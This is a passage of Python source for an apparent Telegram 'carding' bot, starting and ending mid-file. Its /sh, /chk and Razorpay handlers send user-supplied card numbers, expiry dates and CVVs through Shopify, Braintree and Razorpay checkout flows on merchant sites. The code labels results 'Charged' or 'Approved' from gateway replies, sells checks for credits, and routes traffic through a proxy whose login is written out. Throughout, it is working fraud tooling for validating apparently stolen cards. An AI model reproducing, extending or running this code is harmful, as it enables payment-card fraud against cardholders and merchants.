        }
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
            }
            async with aiohttp.ClientSession() as session:
                async with session.get(API_URL, params=params, headers=headers, timeout=aiohttp.ClientTimeout(total=60)) as response:
                    try:
                        api_response = await response.json()
                    except Exception:
                        text = await response.text()
                        api_response = {"Response": text[:200], "status": False}
            
            # Check if the response contains any of the retry errors
            response_text = api_response.get("Response", "").lower()
            should_retry = any(error.lower() in response_text for error in RETRY_ERRORS)
            
            if not should_retry:
                # Format and return the response
                return sh_format_response(api_response, user_info, card_details, brand, issuer, country_name, country_flag, site_url)
            else:
                # Log the retry and continue to the next site
                logger.info(f"Retry error encountered with {site_url}: {response_text}")
                continue
        
        except Exception as e:
            logger.error(f"Error checking card with {site_url}: {e}")
            continue
    
    # If we get here, all sites failed
    return f"⚠️ <b>Error checking card:</b> <code>All sites returned errors</code>"

def sh_format_response(api_response: Dict, user_info: Dict, card_details: str, 
                   brand: str, issuer: str, country_name: str, country_flag: str, site_url: str) -> str:
    """
    Format the API response into a beautiful message with emojis.
    
    Args:
        api_response: Dictionary containing the API response
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        site_url: The site URL that was used for checking
        
    Returns:
        Formatted string with emojis
    """
    response_text = api_response.get("Response", "N/A")
    price = api_response.get("Price", "N/A")
    gate = api_response.get("Gate", "Shopify")
    status = api_response.get("status", False)
    
    response_text = response_text.replace("\\", "").replace("/", "").replace("\"", "").replace("'", "")
    site_name = site_url.replace("https://", "").replace("http://", "").split("/")[0]
    
    # Determine status based on message content with stylish formatting
    status_emoji = "❓"
    status_text = "Unknown"
    status_style = ""
    
    # Check for charged messages
    if any(keyword in response_text.lower() for keyword in ["thank you", "order_placed", "approved", "success", "charged"]):
        status_emoji = "🔥"
        status_text = "Charged"
        status_style = "<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> 🔥"
    # Check for approved messages
    elif any(keyword in response_text.lower() for keyword in ["3d_authentication", "3ds_required", "invalid_cvc", "insufficient_funds", "incorrect_zip"]):
        status_emoji = "✅"
        status_text = "Approved"
        status_style = "<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> ✅"
    # Check for declined messages
    elif "card_declined" in response_text.lower():
        status_emoji = "❌"
        status_text = "Declined"
        status_style = "<b>𝘿𝙚𝙡𝙞𝙣𝙚𝙙</b> ❌"
    # Default status
    else:
        status_style = f"{status_emoji} <b>{status_text}</b>"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Get user credits and format display
    user_credits = get_user_credits(user_id)
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"  # Display for unlimited credits
    else:
        credits_display = str(user_credits)

    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 {price}$</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_text}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_sh_command(update, context):
    """
    Handle the /sh command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = sh_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /sh card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /sh</i>", 
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    user_sites = get_user_sites(user_id)
    if not user_sites and not SITE_URLS:
        await update.message.reply_text(
            """<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ ❓ Unknown</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 NA</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>Set sites first. Use /seturl to add sites.</code>""",
            parse_mode="HTML", disable_web_page_preview=True)
        return
    
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗦𝗵𝗼𝗽𝗶𝗳𝘆</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await sh_check_card(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>Error checking card:</b>"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n\n<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            # disable_web_page_preview=True is added here to stop link previews
            await checking_message.edit_text(result, parse_mode="HTML", disable_web_page_preview=True)
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            error_msg = f"⚠️ <b>Error:</b> <code>{str(e)}</code>"
            await checking_message.edit_text(error_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())

# Also add a handler for /shh command as an alias
async def handle_shh_command(update, context):
    """
    Handle the /shh command as an alias for /sh.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Just call the sh handler
    await handle_sh_command(update, context)



# ============================================================
# MODULE: chk
# ============================================================
# Configure logging

# Create a thread pool executor for background tasks
executor = ThreadPoolExecutor(max_workers=100)

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

# Define approved and CCN patterns for response parsing
approved_patterns = [
    'Nice! New payment method added',
    'Status code 81724: Duplicate card exists in the vault',
    'Payment method successfully added.',
    'Insufficient Funds',
    'Gateway Rejected: avs',
    'Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)',
    'Duplicate',
    'Payment method added successfully',
    'Invalid postal code or street address',
    'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    'succeeded',
    'setup_intent'
]

CCN_patterns = [
    'CVV',
    'Gateway Rejected: avs_and_cvv',
    'Card Issuer Declined CVV',
    'Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)',
    'Gateway Rejected: cvv',
    "Your card's security code is incorrect"
]

def chk_luhn_check(card_number: str) -> bool:
    """
    Validate a credit card number using the Luhn algorithm.
    
    Args:
        card_number: The credit card number to validate
        
    Returns:
        True if the card number is valid, False otherwise
    """
    # Remove any spaces or dashes from the card number
    card_number = card_number.replace(' ', '').replace('-', '')
    
    # Check if the card number contains only digits
    if not card_number.isdigit():
        return False
    
    # Check if the card number has a valid length (13-19 digits)
    if len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Convert the card number to a list of integers
    digits = [int(d) for d in card_number]
    
    # Starting from the rightmost digit, double every second digit
    # If doubling results in a two-digit number, sum the digits
    for i in range(len(digits) - 2, -1, -2):
        digits[i] = digits[i] * 2
        if digits[i] > 9:
            digits[i] = digits[i] % 10 + 1
    
    # Sum all the digits
    total = sum(digits)
    
    # If the total is a multiple of 10, the card number is valid
    return total % 10 == 0

def chk_get_credit_card_details(card_string):
    """Parse card details from various formats"""
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return {
                'number': card_number.replace(' ', ''),  # Remove spaces if any
                'exp_month': month,
                'exp_year': year,
                'cvc': cvv
            }
    
    return None

def chk_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def chk_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def check_card_with_braintree(card_details: str, user_info: Dict) -> Optional[Dict]:
    """
    Check card details using the new Braintree API.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Dictionary with card details and API response or None if there was an error
    """
    # Parse card details
    parsed = chk_parse_card_details(card_details)
    if not parsed:
        return {
            "card_details": card_details,
            "error": "Invalid card format"
        }
    
    card_number, month, year, cvv = parsed
    
    # Validate the card number using Luhn algorithm
    if not chk_luhn_check(card_number):
        return {
            "card_details": card_details,
            "error": "Invalid card number (failed Luhn check)"
        }
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Prepare the API URL with the card details
    # Format the card details for the new API
    formatted_card = f"{card_number}|{month}|{year}|{cvv}"
    api_url = f"{BRAINTREE_API_URL}/gateway=autostripe/key=Blackxcard/site=kabusvuya.com/cc={formatted_card}"
    
    try:
        # Create a session for the request
        timeout = aiohttp.ClientTimeout(total=60)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Make the API request
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"}) as response:
                if response.status != 200:
                    return {
                        "card_details": card_details,
                        "error": "API request failed"
                    }
                
                # Parse the JSON response
                api_response = await response.json()
                
                # Check if we got a valid response
                if not api_response:
                    return {
                        "card_details": card_details,
                        "error": "Empty response from API"
                    }
                
                # Extract response fields
                status = api_response.get("status", "unknown")
                message = api_response.get("response", api_response.get("message", "No response message"))
                
                return {
                    "card_details": card_details,
                    "card_number": card_number,
                    "month": month,
                    "year": year,
                    "cvv": cvv,
                    "api_response": {
                        "status": status,
                        "response": message
                    },
                    "brand": brand,
                    "issuer": issuer,
                    "country": country_name,
                    "country_flag": country_flag
                }
    
    except asyncio.TimeoutError:
        return {
            "card_details": card_details,
            "error": "Request timed out. Please try again."
        }
    except aiohttp.ClientError:
        return {
            "card_details": card_details,
            "error": "Network error. Please try again."
        }
    except Exception:
        return {
            "card_details": card_details,
            "error": "An unexpected error occurred. Please try again."
        }

def format_response_braintree(result: dict, user_info: dict) -> Tuple[str, str]:
    """
    Format the API response into a beautiful message with emojis for Braintree Auth.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Tuple of (formatted string, status category)
    """
    if "error" in result:
        error_msg = result.get('error', 'Unknown error')
        
        # Create a more visually appealing error message
        formatted_error = f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙚𝙩𝙚𝙘𝙩𝙚𝙙</b> ⚠️

<a href='https://t.me/rev3rsex'>💳</a> <b>𝘾𝙖𝙧𝙙:</b> <code>{result.get('card_details', 'Unknown')}</code>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝙍𝙚𝙖𝙨𝙤𝙣:</b> <i>{error_msg}</i>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙏𝙞𝙥:</b> <i>Please check your card details and try again.</i>"""
        
        return formatted_error, "error"
    
    api_response = result.get("api_response", {})
    card_details = result.get("card_details", "")
    brand = result.get("brand", "N/A")
    issuer = result.get("issuer", "N/A")
    country_name = result.get("country", "Unknown")
    country_flag = result.get("country_flag", "")
    
    # Extract response fields
    status = api_response.get("status", "")
    message = api_response.get("response", api_response.get("message", ""))
    
    # Determine status style based on status content
    status_lower = status.lower()
    if status_lower == "approved" or status_lower == "succeeded":
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
        status_category = "approved"
        # For successful responses, show a user-friendly message
        if message == "payment method added successfully":
            message = "Payment method added successfully"
    elif status_lower == "declined":
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
        status_category = "declined"
    else:
        status_style = "<b>𝙀𝙍𝙍𝙊𝙍</b> ⚠️"
        status_category = "error"
        
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response, status_category

# This function will be called from main.py
async def handle_chk_command(update, context):
    """
    Handle the /chk command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = chk_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            """<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙈𝙞𝙨𝙨𝙞𝙣𝙜 𝘾𝙖𝙧𝙙 𝘿𝙚𝙩𝙖𝙞𝙡𝙨</b>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝙐𝙨𝙖𝙜𝙚 𝙊𝙥𝙩𝙞𝙤𝙣𝙨:</b>

<i>1️⃣ Direct command:</i>
<code>/chk 4242424242424242|12|25|123</code>

<i>2️⃣ Reply to message:</i>
Reply to any message containing card details with <code>/chk</code>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙎𝙪𝙥𝙥𝙤𝙧𝙩𝙚𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙨:</b>
<code>card|mm|yy|cvv</code>
<code>card/mm/yy/cvv</code>
<code>card:mm:yy:cvv</code>""",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/rev3rsex'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/rev3rsex'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/rev3rsex'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check with Braintree API
            result = await check_card_with_braintree(card_details, user_info)
            
            # Format the response using format_response_braintree function
            formatted_response, _ = format_response_braintree(result, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.get("error") and not is_unlimited:
                # Deduct 1 credit in the background
                update_user_credits(user_id, -1)
                
                # Get updated credits for the response
                updated_credits = get_user_credits(user_id)
                
                # Add warning if credits are now 0
                if updated_credits is not None and updated_credits <= 0:
                    # Add warning message at the end of the result
                    formatted_response = formatted_response + f"\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            # disable_web_page_preview=True is added here to stop link previews (e.g. for the Dev link)
            await checking_message.edit_text(formatted_response, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            logger.error("Error in background check")
            error_msg = f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙪𝙧𝙞𝙣𝙜 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜</b>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝘿𝙚𝙩𝙖𝙞𝙡𝙨:</b> <code>An unexpected error occurred</code>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙎𝙪𝙜𝙜𝙚𝙨𝙩𝙞𝙤𝙣:</b> <i>Please try again later.</i>"""
            await checking_message.edit_text(error_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())



# ============================================================
# MODULE: rz
# ============================================================
# Configure logging

# List of proxies to use randomly
PROXIES = [
    "http://25chilna:password@209.174.185.196:6226",
]

# API endpoint
API_URL = RAZORPAY_API_URL

# Create a thread pool executor for background tasks
executor = ThreadPoolExecutor(max_workers=100)

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def rz_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: 4169161410569379/12|16|931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379/12|16/931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379/12/16/931
